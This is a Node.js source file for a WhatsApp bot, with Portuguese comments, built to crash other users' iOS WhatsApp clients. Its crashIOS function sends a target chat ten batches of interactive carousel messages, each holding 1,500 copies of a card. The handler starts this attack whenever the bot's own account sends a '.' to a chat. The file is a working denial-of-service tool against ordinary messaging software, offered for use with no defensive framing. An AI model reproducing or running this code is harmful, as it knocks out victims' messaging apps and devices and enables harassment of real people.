// main.js
const {
  generateWAMessageFromContent,
  downloadContentFromMessage,
  makeCacheableSignalKeyStore,
  prepareWAMessageMedia,
  fetchLatestBaileysVersion,
  downloadMediaMessage,
  PHONENUMBER_MCC,
  useMultiFileAuthState,
  generateMessageID,
  getTypeMessage,
  makeWASocket,
  delay,
  proto,
  store,
  chats
} = require("@angstvorfrauen/baileys");
const { Boom } = require("@hapi/boom");
const libPhonenumber = require("libphonenumber-js");
const moment = require("moment-timezone");
const NodeCache = require("node-cache");
const gradient = require("gradient-string");
const path = require("path");
const pino = require("pino");
const Jimp = require("jimp");
const os = require("os");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");

// === ENVIA PONTO (.) PARA ACIONAR O CRASH ===
async function initiateCrash(sock, targetJid) {
  try {
    await sock.sendMessage(targetJid, { text: "." });
    console.log(`[INIT] Ponto enviado para ${targetJid}`);
  } catch (err) {
    console.error("[INIT] Erro ao enviar ponto:", err.message);
  }
}

// === ENVIA 10 LOTES DE 1500 CARDS ===
async function crashIOS(sock, targetJid) {
  console.log(`[CRASH] Iniciando crash para ${targetJid}...`);
  for (let i = 0; i < 10; i++) {
    const singleCard = {
      "header": {
        "title": ".",
        "imageMessage": {
          "url": `${url}`,
          "mimetype": "image/jpeg",
          "caption": ".",
          "fileSha256": `${fileSha256}`,
          "fileLength": "10",
          "height": 1000,
          "width": 1000,
          "mediaKey": `${mediaKey}`,
          "fileEncSha256": `${fileEncSha256}`,
          "directPath": `${directPath}`,
          "jpegThumbnail": `${jpegThumbnail}`
        },
        "hasMediaAttachment": true
      },
      "body": { "text": "." },
      "footer": { "text": "." },
      "nativeFlowMessage": {
        "buttons": [{
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify({
            "display_text": "x",
            "url": "https://google.com",
            "merchant_url": "https://google.com"
          })
        }]
      }
    };

    const cards = Array(1500).fill(singleCard);

    try {
      console.log(`[CRASH] Lote ${i + 1}/10`);
      await sock.sendjson(targetJid, {
        "interactiveMessage": {
          "body": { "text": "." },
          "carouselMessage": { "cards": cards }
        }
      });
      await delay(800); // evita flood
    } catch (err) {
      console.error(`[CRASH] Erro no lote ${i + 1}:`, err.message);
    }
  }
  console.log("[CRASH] Todos os lotes enviados!");
}

// === HANDLER DE MENSAGENS ===
module.exports = async (sock, m, chatUpdate) => {
  try {
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.text = m.message?.conversation
      || m.message?.extendedTextMessage?.text
      || m.message?.imageMessage?.caption
      || m.message?.videoMessage?.caption
      || "";

    const from = m.chat;

    // === ACIONA CRASH QUANDO O BOT ENVIA "."
    if (m.fromMe && m.text === "." && !m.isBaileys) {
      await crashIOS(sock, from);
      return;
    }

    // === OUTROS COMANDOS (se precisar) ===
    // ...

  } catch (err) {
    console.error("Erro no handler:", err);
  }
};

// === EXPORTA FUNÇÕES (1 argumento cada) ===
module.exports.initiateCrash = initiateCrash;
module.exports.crashIOS = crashIOS;

// === HOT RELOAD ===
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("[HOT-RELOAD] main.js recarregado");
  delete require.cache[file];
  require(file);
});
